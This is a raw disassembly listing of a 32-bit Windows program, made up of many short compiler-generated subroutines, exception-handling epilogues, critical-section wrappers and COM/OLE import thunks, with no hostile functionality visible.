mov eax [ ebx ]
mov edx [ eax ]
mov [ ebx ] edx
mov edx 0x8
call sub_4027ac
pop ebx
retn
sub_40cfa0
mov edx 0xffffffff
xchg edx eax
[ edx ] eax
dec eax
retn
sub_40cfac
xchg [ eax ] edx
mov eax edx
retn
sub_40d00c
push ebp
mov ebp esp
push ecx
call GetCurrentThreadId
mov [ ebp - 0x2 ] ax
mov al [ ebp - 0x2 ]
xor al [ ebp - 0x1 ]
and al 0xf
pop ecx
pop ebp
retn
sub_40d09c
mov eax [ edx ]
xor ecx ecx
mov [ eax + 0x4 ] ecx
mov eax [ edx ]
xor edx edx
mov [ eax + 0x8 ] edx
retn
sub_40d1b4
mov eax [ eax + 0x10 ]
push eax
call SetEvent
retn
sub_40d1dc
mov edx [ eax + 0x18 ]
push edx
mov eax [ eax + 0x14 ]
push eax
call WaitForSingleObject
retn
sub_40d457
jmp sub_403970
sub_40d45e
mov eax ebx
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_40d4cc
jmp sub_403970
sub_40d4d3
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40d4f1
mov eax [ ebp - 0xc ]
push eax
call SetErrorMode
retn
sub_40d4ea
jmp sub_403970
sub_40d4f1
mov eax [ ebp - 0x8 ]
pop ebx
mov esp ebp
pop ebp
retn
sub_40d941
jmp sub_403970
sub_40d948
pop ebp
retn
sub_40d9b4
jmp sub_403970
sub_40d9bb
pop ebp
retn
VariantInit
jmp [ VariantInit@IAT ]
VariantCopyInd
jmp [ __import_lookup_table_11(oleaut32:VariantCopyInd) ]
VariantChangeType
jmp [ __import_lookup_table_11(oleaut32:VariantChangeType) ]
sub_40da3c
push ebp
mov ebp esp
mov eax 0x80004001
pop ebp
retn 0x10
sub_40daa2
jmp sub_403970
sub_40daa9
mov eax ebx
pop ebx
pop ecx
pop ebp
retn 0x10
sub_40db0e
jmp sub_403970
sub_40db15
mov eax ebx
pop ebx
pop ecx
pop ebp
retn 0x10
sub_40db7a
jmp sub_403970
sub_40db81
mov eax ebx
pop ebx
pop ecx
pop ebp
retn 0x10
sub_40dbe6
jmp sub_403970
sub_40dbed
mov eax ebx
pop ebx
pop ecx
pop ebp
retn 0x10
sub_40dc52
jmp sub_403970
sub_40dc59
mov eax ebx
pop ebx
pop ecx
pop ebp
retn 0x10
sub_40dcd1
jmp sub_403970
sub_40dcd8
mov eax ebx
pop ebx
pop ecx
pop ecx
pop ebp
retn 0x10
sub_40dd44
jmp sub_403970
sub_40dd4b
mov eax ebx
pop ebx
pop ecx
pop ebp
retn 0x14
sub_40ddb4
jmp sub_403970
sub_40ddbb
mov eax ebx
pop ebx
pop ecx
pop ebp
retn 0x14
sub_40de28
jmp sub_403970
sub_40de2f
mov eax ebx
pop ebx
pop ecx
pop ebp
retn 0x10
SafeArrayCreate
jmp [ __import_lookup_table_11(oleaut32:SafeArrayCreate) ]
SafeArrayGetLBound
jmp [ __import_lookup_table_11(oleaut32:SafeArrayGetLBound) ]
SafeArrayGetUBound
jmp [ __import_lookup_table_11(oleaut32:SafeArrayGetUBound) ]
SafeArrayAccessData
jmp [ __import_lookup_table_11(oleaut32:SafeArrayAccessData) ]
SafeArrayUnaccessData
jmp [ SafeArrayUnaccessData@IAT ]
SafeArrayGetElement
jmp [ SafeArrayGetElement@IAT ]
SafeArrayPutElement
jmp [ SafeArrayPutElement@IAT ]
sub_40e1d5
jmp sub_403970
sub_40e1dc
pop ebp
retn
sub_40e1e0
sub [ rw-data ] 0x1
jae r-xdata
retn
call sub_40dea4
sub_40e1f1
add [ esp + 0x4 ] 0xfffffff8
mov eax [ esp + 0x4 ]
mov eax [ eax ]
jmp [ eax ]
sub_40e384
add [ esp + 0x4 ] 0xfffffff4
jmp sub_4151bc
sub_40e986
jmp sub_403970
sub_40e98d
pop ecx
pop ebp
retn
sub_40ea1f
jmp sub_403970
sub_40ea26
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_40ea76
jmp sub_403970
sub_40ea7d
pop ecx
pop ebp
retn
sub_40eb0f
jmp sub_403970
sub_40eb16
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_40eb66
jmp sub_403970
sub_40eb6d
pop ecx
pop ebp
retn
sub_40edb5
jmp sub_403970
sub_40edbc
pop ebx
mov esp ebp
pop ebp
retn
sub_40eed2
jmp sub_403970
sub_40eed9
pop ecx
pop ebp
retn
sub_40eedc
push ebx
mov ebx eax
mov eax ebx
call sub_40f174
mov [ ebx ] 0x1
pop ebx
retn
sub_40f188
push eax
call sub_40f174
pop eax
retn
sub_40f3e8
call sub_40f49c
retn
sub_40f500
xchg edx eax
call sub_412e2c
retn
sub_40f508
call sub_40f71c
retn
sub_40f70d
jmp sub_403970
sub_40f714
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_40f71c
test [ edx + 0x1 ] 0x40
jne r-xdata
call sub_40f544
retn
call sub_40f49c
retn
j_sub_40f730
jmp sub_40f730
sub_40f755
retn
sub_40f7b4
jmp sub_403970
sub_40f7bb
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_40f802
jmp sub_403970
sub_40f809
pop ebx
pop ecx
pop ebp
retn
sub_40f84e
jmp sub_403970
sub_40f855
pop ebx
pop ecx
pop ebp
retn
sub_40f89a
jmp sub_403970
sub_40f8a1
pop ebx
pop ecx
pop ebp
retn
sub_40f8e6
jmp sub_403970
sub_40f8ed
pop ebx
pop ecx
pop ebp
retn
sub_40fcaf
jmp sub_403970
sub_40fcb6
mov eax [ ebp - 0x4 ]
pop ebx
mov esp ebp
pop ebp
retn
sub_40fd50
jmp sub_403970
sub_40fd57
mov eax [ ebp - 0x4 ]
pop ebx
mov esp ebp
pop ebp
retn
sub_4101c5
jmp sub_4036bc
sub_410280
jmp sub_4036bc
sub_410327
jmp sub_4036bc
sub_410420
jmp sub_4036bc
sub_4104f9
jmp sub_4036bc
sub_4105e1
jmp sub_4036bc
sub_41079e
jmp sub_403970
sub_4107a5
mov eax [ ebp - 0x8 ]
mov edx [ ebp - 0x4 ]
pop ebx
mov esp ebp
pop ebp
retn
sub_410807
jmp sub_403970
sub_41080e
mov eax [ ebp - 0x8 ]
mov edx [ ebp - 0x4 ]
pop ebx
mov esp ebp
pop ebp
retn
sub_410c74
jmp sub_4036bc
sub_410d63
jmp sub_403970
sub_410d6a
mov al [ ebp - 0x1 ]
pop ebx
mov esp ebp
pop ebp
retn
sub_410e08
jmp sub_403970
sub_410e0f
mov al [ ebp - 0x1 ]
pop ebx
mov esp ebp
pop ebp
retn
sub_4111ac
call sub_410e64
neg al
sbb eax eax
neg eax
retn
sub_41126d
jmp sub_403970
sub_411274
fld [ ebp - 0x8 ]
pop ebx
mov esp ebp
pop ebp
retn
sub_41131d
jmp sub_403970
sub_411324
fld [ ebp - 0x8 ]
pop ebx
mov esp ebp
pop ebp
retn
sub_411875
jmp sub_4036bc
sub_41197c
jmp sub_403970
sub_411983
fld [ ebp - 0x8 ]
pop ebx
mov esp ebp
pop ebp
retn
sub_411a8d
jmp sub_403970
sub_411a94
fld [ ebp - 0x8 ]
pop ebx
mov esp ebp
pop ebp
retn
sub_411ee4
jmp sub_403970
sub_411eeb
fild [ ebp - 0x8 ]
pop ebx
mov esp ebp
pop ebp
retn
sub_411ff5
jmp sub_403970
sub_411ffc
fild [ ebp - 0x8 ]
pop ebx
mov esp ebp
pop ebp
retn
sub_412542
jmp sub_403970
sub_412549
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_4125ed
jmp sub_403970
sub_4125f4
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_412616
lea eax [ ebp - 0x18 ]
mov edx 0x2
call sub_404690
retn
sub_41260f
jmp sub_403970
sub_412616
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_412672
jmp sub_403970
sub_412679
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_4126f5
jmp sub_403970
sub_412c3b
jmp sub_403970
sub_412c42
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_412cd5
jmp sub_403970
sub_412cdc
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_412cf9
lea eax [ ebp - 0x14 ]
call sub_404678
retn
sub_412cf2
jmp sub_403970
sub_412cf9
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_412d56
jmp sub_403970
sub_412d5d
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_412dff
jmp sub_403970
sub_412e1c
jmp sub_403970
sub_412e23
mov al [ ebp - 0x5 ]
pop ebx
mov esp ebp
pop ebp
retn
sub_41337e
jmp sub_403970
sub_413385
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_4133f6
jmp sub_403970
sub_4133fd
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_413788
push eax
call sub_40f174
pop eax
mov [ eax ] 0x7
fstp [ eax + 0x8 ]
fwait
retn
sub_41379c
push eax
call sub_40f174
pop eax
mov [ eax ] 0x6
fistp [ eax + 0x8 ]
fwait
retn
sub_41381f
jmp sub_403970
sub_413826
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_4138ff
jmp sub_403970
sub_413906
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_413962
jmp sub_403970
sub_413969
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_413970
call sub_413978
retn
sub_413ac8
cmp [ eax ] 0x8
jb r-xdata
retn
push [ eax + 0xc ]
push [ eax + 0x8 ]
push [ eax + 0x4 ]
push [ eax ]
mov [ eax ] 0x0
mov edx esp
call sub_40f49c
add esp 0x10
sub_413d72
jmp sub_403970
sub_413d79
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_413dc0
jmp r-xdata
cmp [ eax ] 0x400c
je r-xdata
mov eax [ eax + 0x8 ]
retn
sub_413dd0
push ecx
mov edx esp
call sub_415800
pop edx
retn
sub_413ddc
cmp ax 0x8
je r-xdata
mov al 0x1
retn
cmp ax 0x100
je r-xdata
xor eax eax
retn
sub_413df0
push ebx
mov ebx eax
mov eax ebx
call sub_413dc0
cmp [ eax ] 0x1
sete al
pop ebx
retn
sub_413e91
jmp sub_403970
sub_413e98
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_413ecc
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
call sub_40f174
mov [ ebx ] 0xa
mov [ ebx + 0x8 ] esi
pop esi
pop ebx
retn
sub_413ee4
mov edx 0x80020004
call sub_413ecc
retn
sub_414094
push ebx
mov ebx eax
mov eax ebx
call sub_413fdc
push eax
call SafeArrayUnaccessData
call sub_40edc4
pop ebx
retn
sub_4140ac
mov edx eax
sub dx 0x16
jae r-xdata
xor eax eax
retn
movzx eax ax
lea eax [ eax + eax * 2 ]
mov edx [ rw-data ]
cmp [ edx + eax * 4 ] 0x0
jne r-xdata
mov al 0x1
retn
sub_4141c8
jmp sub_403970
sub_4141cf
pop ebx
mov esp ebp
pop ebp
retn
sub_414330
jmp sub_403970
sub_4143a8
xor edx edx
test eax eax
je r-xdata
mov eax edx
retn
xor ecx ecx
mov cl [ eax + 0x1 ]
add eax ecx
mov ecx [ eax + 0x6 ]
test ecx ecx
je r-xdata
mov edx [ ecx ]
sub_4143c4
push ebx
xor ebx ebx
jmp r-xdata
test eax eax
je r-xdata
mov eax ebx
pop ebx
retn
cmp [ eax ] 0x11
je r-xdata
inc ebx
call sub_4143a8
sub_4148b3
jmp sub_403970
sub_4148ee
jmp sub_403970
sub_4148f5
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_414bcd
jmp sub_403970
sub_414bfd
jmp sub_403970
sub_414c04
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_414c91
jmp sub_403970
sub_414c98
pop esi
pop ebx
pop ebp
retn
sub_414c9c
push ebp
mov ebp esp
call sub_415128
pop ebp
retn 0x4
sub_414d28
push ebp
mov ebp esp
call sub_415128
pop ebp
retn 0x4
sub_41501c
jmp sub_403970
sub_415023
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_415050
lea eax [ ebp - 0x140 ]
call sub_403f6c
lea eax [ ebp - 0x24 ]
mov edx 0x3
call sub_403f90
retn
sub_415049
jmp sub_403970
sub_4150d7
jmp sub_403970
sub_4150de
mov dl [ ebp - 0x5 ]
and dl 0xfc
mov eax [ ebp - 0x4 ]
call sub_40320c
cmp [ ebp - 0x5 ] 0x0
jle r-xdata
pop ecx
pop ecx
pop ebp
retn
mov eax [ ebp - 0x4 ]
call sub_403590
sub_415100
xor eax eax
retn
sub_415104
push ebp
mov ebp esp
mov edx [ ebp + 0x8 ]
mov ax [ eax + 0x4 ]
mov [ edx ] ax
mov al 0x1
pop ebp
retn 0x4
sub_415118
mov [ ecx ] 0x8
mov al 0x1
retn
sub_415120
call sub_40e93c
retn
sub_415128
call sub_40ea2c
retn
sub_415138
push ebp
mov ebp esp
mov edx [ ebp + 0x8 ]
mov ax [ eax + 0x4 ]
mov [ edx ] ax
mov al 0x1
pop ebp
retn 0x4
sub_41514c
call sub_415128
retn
sub_415164
mov eax edx
mov edx ecx
call sub_40f71c
retn
sub_415170
push ebp
mov ebp esp
mov eax edx
mov edx ecx
movzx ecx [ ebp + 0x8 ]
call sub_40f9e0
pop ebp
retn 0x4
sub_415184
test [ edx + 0x1 ] 0x40
setne al
retn
sub_41518c
push ebp
mov ebp esp
call sub_415130
pop ebp
retn 0x8
sub_415198
mov eax edx
mov edx ecx
call sub_4137b0
retn
sub_4151a4
mov eax edx
mov edx ecx
call sub_41382c
retn
sub_4151b0
push ebp
mov ebp esp
or eax 0xffffffff
pop ebp
retn 0x4
sub_4151bc
push ebp
mov ebp esp
or eax 0xffffffff
pop ebp
retn 0x4
sub_4151f0
mov ax [ edx ]
call sub_413ddc
retn
sub_4151fc
push ebx
push esi
mov esi ecx
mov ebx edx
mov edx esi
mov eax ebx
call sub_413e04
pop esi
pop ebx
retn
sub_415210
push ebx
push esi
mov esi ecx
mov ebx edx
mov edx esi
mov eax ebx
call sub_407ef0
pop esi
pop ebx
retn
sub_41525c
jmp [ edx + edx * 2 ]
sub_415515
jmp sub_403970
sub_41551c
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_41566f
jmp sub_403970
sub_4157c0
jmp sub_403970
sub_4157c7
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x8
sub_4157d0
push ebp
mov ebp esp
xor eax eax
pop ebp
retn 0x4
sub_4157dc
push ebp
mov ebp esp
xor eax eax
pop ebp
retn 0x4
sub_4157e8
push ebp
mov ebp esp
xor eax eax
pop ebp
retn 0x8
sub_4157f4
push ebp
mov ebp esp
xor eax eax
pop ebp
retn 0x4
sub_4158a8
jmp sub_403970
sub_415971
jmp sub_403970
sub_415978
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_415995
lea eax [ ebp - 0x10 ]
call sub_403f6c
retn
sub_41598e
jmp sub_403970
sub_415995
mov al [ ebp - 0x9 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_4159a0
call sub_40eedc
retn
sub_415a17
jmp sub_403970
sub_415a1e
pop ebp
retn
sub_415ac1
jmp sub_403970
sub_415ac8
pop ebp
retn
sub_415bf0
pop ebp
retn
sub_415bf4
sub [ rw-data ] 0x1
retn
sub_415bfd
add eax 0xfffffff0
push eax
mov eax [ eax ]
mov eax [ eax + 0x50 ]
xchg [ esp ] eax
retn
sub_415c0a
add [ esp + 0x4 ] 0xfffffff0
mov eax [ esp + 0x4 ]
mov eax [ eax ]
jmp [ eax ]
sub_4160c7
jmp sub_403970
sub_4160ce
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
sub_4163f8
jmp sub_403970
sub_4163ff
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_416467
jmp sub_403970
sub_41646e
mov eax ebx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
sub_41656e
jmp sub_403970
sub_416575
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_416904
jmp sub_403970
sub_41690b
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
sub_416a43
jmp sub_403970
sub_416a4a
mov eax esi
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_416b10
push ebx
add esp 0xffffff00
mov ebx ecx
push 0xff
lea ecx [ esp + 0x4 ]
call sub_416a78
mov eax ebx
mov edx esp
call sub_4041d0
add esp 0x100
pop ebx
retn
sub_416b6c
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
mov edx esi
call sub_403fc0
pop esi
pop ebx
retn
sub_416c48
jmp sub_403970
sub_416c4f
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_416ca0
jmp sub_403970
sub_416ca7
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_416df4
jmp sub_403970
sub_416dfb
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_416eca
jmp sub_403970
sub_416ed1
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_4171e8
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
mov edx esi
call sub_40f49c
pop esi
pop ebx
retn
sub_4173d2
jmp sub_403970
sub_4173d9
pop ebp
retn
sub_4173dc
sub [ rw-data ] 0x1
retn
IsEqualGUID
jmp [ IsEqualGUID@IAT ]
CoInitialize
jmp [ __import_lookup_table_12(ole32:CoInitialize) ]
CoUninitialize
jmp [ __import_lookup_table_12(ole32:CoUninitialize) ]
CoGetClassObject
jmp [ __import_lookup_table_12(ole32:CoGetClassObject) ]
CoCreateInstance
jmp [ __import_lookup_table_12(ole32:CoCreateInstance) ]
StringFromCLSID
jmp [ __import_lookup_table_12(ole32:StringFromCLSID) ]
ProgIDFromCLSID
jmp [ __import_lookup_table_12(ole32:ProgIDFromCLSID) ]
CoTaskMemFree
jmp [ __import_lookup_table_12(ole32:CoTaskMemFree) ]
OleSetMenuDescriptor
jmp [ OleSetMenuDescriptor@IAT ]
OleDraw
jmp [ OleDraw@IAT ]
IsAccelerator
jmp [ IsAccelerator@IAT ]
CreateStreamOnHGlobal
jmp [ CreateStreamOnHGlobal@IAT ]
SysFreeString
jmp [ __import_lookup_table_13(oleaut32:SysFreeString) ]
GetErrorInfo
jmp [ __import_lookup_table_13(oleaut32:GetErrorInfo) ]
sub_417709
jmp sub_403970
sub_417710
pop ebp
retn
sub_417714
sub [ rw-data ] 0x1
retn
sub_417fa1
jmp eax
sub_418434
sbb dl al
inc ecx
add [ edi + edi * 4 ] dl
inc ecx
add [ eax ] ch
retn 0x41
sub_4189d7
add [ esp + 0x4 ] 0xffffffd8
jmp sub_42030c
sub_4189e1
add [ esp + 0x4 ] 0xffffffd8
jmp sub_42032c
sub_4189eb
add [ esp + 0x4 ] 0xffffffd4
mov eax [ esp + 0x4 ]
mov eax [ eax ]
jmp [ eax + 0x28 ]
sub_418d58
push ecx
mov [ esp ] ax
mov [ esp + 0x2 ] dx
mov eax [ esp ]
pop edx
retn
sub_418e7c
mov eax [ eax + 0xc ]
call sub_41a040
retn
sub_419153
jmp sub_403970
sub_41915a
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_419160
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax [ ebx + 0x4 ]
call sub_41a1f8
test eax eax
setge al
pop esi
pop ebx
retn
sub_419463
jmp sub_403970
sub_41946a
mov esp ebp
pop ebp
retn
sub_419538
add eax 0x8
push eax
call EnterCriticalSection
retn
sub_419544
push ebx
mov ebx edx
mov edx ebx
call sub_419358
test eax eax
je r-xdata
pop ebx
retn
mov edx ebx
call sub_4190b8
sub_4195f0
add eax 0x8
push eax
call LeaveCriticalSection
retn
sub_41974b
jmp sub_403970
sub_41981f
jmp sub_403970
sub_419830
mov eax [ eax - 0x38 ]
or eax eax
je r-xdata
retn
mov eax [ eax + 0x2 ]
sub_41989c
jmp sub_403970
sub_4198a3
pop ebx
mov esp ebp
pop ebp
retn
sub_4198ee
jmp sub_403970
sub_4198f5
mov eax [ ebp - 0x4 ]
pop ebx
pop ecx
pop ebp
retn
sub_419981
jmp sub_403970
sub_419988
pop ebx
pop ebp
retn
sub_4199ce
jmp sub_403970
sub_4199d5
pop ebx
pop ebp
retn
sub_419a1a
jmp sub_403970
sub_419a21
pop ebx
pop ebp
retn
sub_419a6b
jmp sub_403970
sub_419a72
pop esi
pop ebx
pop ebp
retn
sub_419ac6
jmp sub_403970
sub_419acd
mov eax [ ebp - 0x4 ]
pop ebx
pop ecx
pop ebp
retn
sub_419bfa
jmp sub_403970
sub_419cd0
cmp [ rw-data ] 0x0
je r-xdata
retn
mov edx eax
mov eax [ rw-data ]
call sub_41a2e0
sub_419dc0
jmp sub_403970
sub_419f4a
jmp sub_403970
sub_419f51
mov eax ebx
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_419feb
jmp sub_403970
sub_419ff2
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41a011
mov eax [ rw-data ]
mov edx [ eax ]
call [ edx + 0x18 ]
retn
sub_41a00a
jmp sub_403970
sub_41a011
mov al [ ebp - 0x9 ]
mov esp ebp
pop ebp
retn
sub_41a074
push ebx
mov ebx eax
xor edx edx
mov eax ebx
call sub_41a33c
xor edx edx
mov eax ebx
call sub_41a300
pop ebx
retn
sub_41a0ec
mov eax [ ebp + 0x4 ]
retn
sub_41a122
pop ecx
pop edx
pop esi
pop ebx
retn
sub_41a170
jmp sub_403970
sub_41a177
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_41a17c
push ebx
mov ebx eax
mov eax [ ebx + 0x8 ]
cmp eax [ ebx + 0xc ]
jne r-xdata
mov eax ebx
pop ebx
retn
mov eax ebx
mov edx [ eax ]
call [ edx ]
sub_41a194
xor edx edx
call sub_41a19c
retn
sub_41a284
mov edx [ eax + 0x8 ]
dec edx
call sub_41a19c
retn
sub_41a3ac
retn
sub_41a466
jmp sub_403970
sub_41a46d
cmp [ ebp - 0x5 ] 0x0
jle r-xdata
pop ecx
pop ecx
pop ebp
retn
mov eax [ ebp - 0x4 ]
call sub_403590
sub_41a4fc
jmp sub_403970
sub_41a503
pop ebx
pop ecx
pop ebp
retn
sub_41a508
push ebx
mov ebx eax
lea eax [ ebx + 0x8 ]
push eax
call EnterCriticalSection
mov eax [ ebx + 0x4 ]
pop ebx
retn
sub_41a55f
jmp sub_403970
sub_41a566
pop ebx
pop ecx
pop ebp
retn
sub_41a56c
add eax 0x8
push eax
call LeaveCriticalSection
retn
sub_41a5a8
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b980
call sub_4039a8
retn
sub_41a5c0
mov ecx eax
cmp edx eax
jge r-xdata
mov eax ecx
retn
mov ecx edx
sub_41a69b
retn
sub_41a740
test edx edx
je r-xdata
xor edx edx
call sub_41a754
retn
xchg edx eax
mov ecx [ eax ]
call [ ecx ]
retn
sub_41a80a
jmp sub_403970
sub_41a811
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_41a824
xchg edx eax
call sub_41a754
retn
sub_41a82c
retn
sub_41a8c5
jmp sub_403970
sub_41a8cc
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_41aa16
jmp sub_403970
sub_41ab26
jmp sub_403970
sub_41ab2d
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41ab4a
lea eax [ ebp - 0xc ]
call sub_403f6c
retn
sub_41ab43
jmp sub_403970
sub_41ab4a
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_41abd4
jmp sub_403970
sub_41abec
push ebx
mov ebx eax
cmp [ ebx + 0x8 ] 0x0
jne r-xdata
inc [ ebx + 0x8 ]
pop ebx
retn
mov dl 0x1
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x30 ]
sub_41aca8
dec [ eax + 0x8 ]
cmp [ eax + 0x8 ] 0x0
jne r-xdata
retn
xor edx edx
mov ecx [ eax ]
call [ ecx + 0x30 ]
sub_41ad51
jmp sub_403970
sub_41ad58
mov al [ ebp - 0x9 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_41ad64
mov eax [ ebp + 0x4 ]
retn
sub_41ad9a
pop ecx
pop edx
pop esi
pop ebx
retn
sub_41ade8
jmp sub_403970
sub_41adef
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_41aeae
jmp sub_403970
sub_41aeb5
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41aed7
lea eax [ ebp - 0x10 ]
mov edx 0x2
call sub_403f90
retn
sub_41aed0
jmp sub_403970
sub_41aed7
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_41aee0
mov edx [ eax ]
call [ edx + 0x14 ]
retn
sub_41aee8
xor eax eax
retn
sub_41af31
jmp sub_403970
sub_41af38
mov eax ebx
pop ebx
pop ecx
pop ebp
retn
sub_41b04b
jmp sub_403970
sub_41b052
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_41b0e0
jmp sub_403970
sub_41b0e7
mov eax [ ebp - 0x8 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_41b1b7
jmp sub_403970
sub_41b1be
mov eax [ ebp - 0x8 ]
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_41b274
jmp sub_403970
sub_41b27b
pop esi
pop ecx
pop ebp
retn
sub_41b300
jmp sub_403970
sub_41b307
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41b324
lea eax [ ebp - 0x8 ]
call sub_403f6c
retn
sub_41b31d
jmp sub_403970
sub_41b324
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_41b3b0
jmp sub_403970
sub_41b3cd
jmp sub_403970
sub_41b3d4
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_41b410
retn
sub_41b493
jmp sub_403970
sub_41b49a
mov eax [ ebp - 0x8 ]
call sub_41dfd4
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41b4bf
lea eax [ ebp - 0xc ]
call sub_403f6c
retn
sub_41b4b8
jmp sub_403970
sub_41b4bf
mov esp ebp
pop ebp
retn
sub_41b50f
jmp sub_403970
sub_41b516
pop esi
pop ecx
pop ebp
retn
sub_41b569
jmp sub_403970
sub_41b570
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_41b578
retn
sub_41b5f3
jmp sub_403970
sub_41b5fa
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_41b697
jmp sub_403970
sub_41b69e
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41b6bb
lea eax [ ebp - 0x8 ]
call sub_403f6c
retn
sub_41b6b4
jmp sub_403970
sub_41b6bb
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_41b6c0
retn
sub_41b73a
jmp sub_403970
sub_41b741
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_41b748
mov eax edx
mov edx ecx
call sub_4080d0
retn
sub_41b754
push ebx
mov ebx eax
test [ ebx + 0x4 ] 0x4
jne r-xdata
mov al [ ebx + 0x7 ]
pop ebx
retn
mov dl 0x3d
mov eax ebx
call sub_41b76c
sub_41b7e4
push ebx
xor ecx ecx
mov ebx [ eax ]
call [ ebx + 0x3c ]
pop ebx
retn
sub_41b854
push ebx
cmp [ eax + 0x8 ] 0x0
jne r-xdata
pop ebx
retn
cmp [ eax + 0x22 ] 0x0
je r-xdata
mov ebx eax
mov edx eax
mov eax [ ebx + 0x24 ]
call [ ebx + 0x20 ]
sub_41b870
push ebx
cmp [ eax + 0x8 ] 0x0
jne r-xdata
pop ebx
retn
cmp [ eax + 0x2a ] 0x0
je r-xdata
mov ebx eax
mov edx eax
mov eax [ ebx + 0x2c ]
call [ ebx + 0x28 ]
sub_41ba64
mov eax [ eax + 0x18 ]
retn
sub_41ba68
mov eax [ eax + 0x14 ]
retn
sub_41bb04
push ebx
push esi
mov esi eax
push 0x0
mov eax esi
mov ebx [ eax ]
call [ ebx + 0x64 ]
pop esi
pop ebx
retn
sub_41bd10
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
shl edx 0x3
lea eax [ ebx + 0x10 ]
call sub_4027cc
mov [ ebx + 0x18 ] esi
pop esi
pop ebx
retn
sub_41bd4c
test dl dl
je r-xdata
mov edx [ eax ]
call [ edx + 0x80 ]
retn
mov edx [ eax ]
call [ edx + 0x84 ]
retn
sub_41bd64
push ebx
mov ebx [ eax + 0x10 ]
mov ecx [ ebx + ecx * 8 ]
mov ebx [ eax + 0x10 ]
mov edx [ ebx + edx * 8 ]
mov ebx [ eax ]
call [ ebx + 0x34 ]
pop ebx
retn
sub_41bd78
mov edx sub_41bd64
mov ecx [ eax ]
call [ ecx + 0x94 ]
retn
sub_41bdc0
cmp [ eax + 0x1e ] 0x0
je r-xdata
mov eax edx
mov edx ecx
call sub_4080d0
retn
mov eax edx
mov edx ecx
call sub_408098
retn
sub_41be5c
retn
sub_41c154
jmp sub_403970
sub_41c15b
mov eax [ ebp - 0x10 ]
mov edx [ ebp - 0xc ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x8
sub_41c1bc
jmp sub_403970
sub_41c1c3
mov eax [ ebp - 0x4 ]
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_41c208
mov eax [ eax + 0x4 ]
call sub_408648
cmp eax 0xffffffff
jne r-xdata
retn
xor eax eax
sub_41c218
mov eax [ eax + 0x4 ]
call sub_408674
